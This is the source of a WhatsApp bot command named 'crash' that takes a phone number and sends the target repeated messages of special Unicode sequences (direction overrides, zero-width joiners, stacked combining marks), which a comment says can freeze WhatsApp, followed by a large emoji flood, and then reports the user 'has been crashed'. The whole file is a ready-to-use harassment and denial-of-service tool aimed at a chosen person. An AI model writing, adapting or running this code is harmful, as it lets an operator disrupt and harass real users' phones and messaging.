export default {
  name: 'crash',
  description: 'Crash a user\'s WhatsApp',
  category: 'dangerous',
  aliases: ['crush', 'freeze'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      return sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ CRASH USER 〕━━━┈⊷
┃ Usage: ${prefix}crash <number>
┃ 
┃ Example: ${prefix}crash 27797352930
┃ 
┃ ⚠️ Can crash WhatsApp!
┃ 🧛 "The darkness crushes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ CRASHING USER 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 🧛 "The darkness crushes..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      // Crash characters that can freeze WhatsApp
      const crashChars = [
        '‮⁦⁦⁦⁩⁩⁩‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦',
        '🫸🫷🫸🫷🫸🫷🫸🫷🫸🫷',
        '⁣‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌‍‌',
        '⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤',
        '̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸',
        '࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔࿓࿔'
      ];

      for (let i = 0; i < 10; i++) {
        try {
          await sock.sendMessage(userJid, {
            text: crashChars[i % crashChars.length].repeat(3)
          });
          await new Promise(resolve => setTimeout(resolve, 200));
        } catch {}
      }

      // Send large message flood
      let largeMsg = '';
      for (let i = 0; i < 1000; i++) {
        largeMsg += '🩸🧛🌑💀🔥⚡🦇👻';
      }

      await sock.sendMessage(userJid, {
        text: largeMsg.substring(0, 5000)
      });

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ CRASH SENT 〕━━━┈⊷
┃ 👤 ${target} has been crashed!
┃ 🧛 "The darkness crushes."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
